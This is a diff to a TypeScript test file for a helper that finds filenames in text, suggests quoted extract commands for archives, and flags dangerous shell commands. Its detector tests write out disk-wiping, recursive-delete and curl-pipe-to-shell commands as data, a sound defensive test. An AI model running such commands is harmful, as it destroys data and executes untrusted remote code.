@@ -40,6 +40,12 @@ describe("findActionLinks", () => {
     });
     expect(findActionLinks("data.zip")[0]).toMatchObject({ text: "data.zip", kind: "archive" });
   });
+
+  it("keeps only the longest match when entities overlap (e.g. 1.2.3.4.zip)", () => {
+    const matches = findActionLinks("downloaded 1.2.3.4.zip ok");
+    expect(matches).toHaveLength(1);
+    expect(matches[0]).toMatchObject({ text: "1.2.3.4.zip", kind: "archive" });
+  });
 });
 
 describe("actionsFor", () => {
@@ -55,21 +61,21 @@ describe("actionsFor", () => {
     expect(cmds).toContain("nc example.com 8080");
   });
 
-  it("offers the right extract command per archive type", () => {
+  it("offers the right extract command per archive type, with the filename quoted", () => {
     const extract = (f: string) => actionsFor(match(f, "archive")).map((a) => a.command);
-    expect(extract("data.zip")).toContain("unzip data.zip");
-    expect(extract("backup.tar.gz")).toContain("tar -xzf backup.tar.gz");
-    expect(extract("photos.tgz")).toContain("tar -xzf photos.tgz");
-    expect(extract("logs.tar")).toContain("tar -xf logs.tar");
-    expect(extract("blob.7z")).toContain("7z x blob.7z");
+    expect(extract("data.zip")).toContain("unzip 'data.zip'");
+    expect(extract("backup.tar.gz")).toContain("tar -xzf 'backup.tar.gz'");
+    expect(extract("photos.tgz")).toContain("tar -xzf 'photos.tgz'");
+    expect(extract("logs.tar")).toContain("tar -xf 'logs.tar'");
+    expect(extract("blob.7z")).toContain("7z x 'blob.7z'");
   });
 
   it("offers a list-contents action for archives", () => {
     expect(actionsFor(match("data.zip", "archive")).map((a) => a.command)).toContain(
-      "unzip -l data.zip",
+      "unzip -l 'data.zip'",
     );
     expect(actionsFor(match("backup.tar.gz", "archive")).map((a) => a.command)).toContain(
-      "tar -tzf backup.tar.gz",
+      "tar -tzf 'backup.tar.gz'",
     );
   });
 });
@@ -81,6 +87,7 @@ describe("isDangerousCommand", () => {
     expect(isDangerousCommand("dd if=/dev/zero of=/dev/sda")).toBe(true);
     expect(isDangerousCommand("mkfs.ext4 /dev/sda1")).toBe(true);
     expect(isDangerousCommand("curl http://get.example.sh | sh")).toBe(true);
+    expect(isDangerousCommand("rm --recursive --force /tmp/x")).toBe(true);
   });
 
   it("treats the safe action commands as not dangerous", () => {
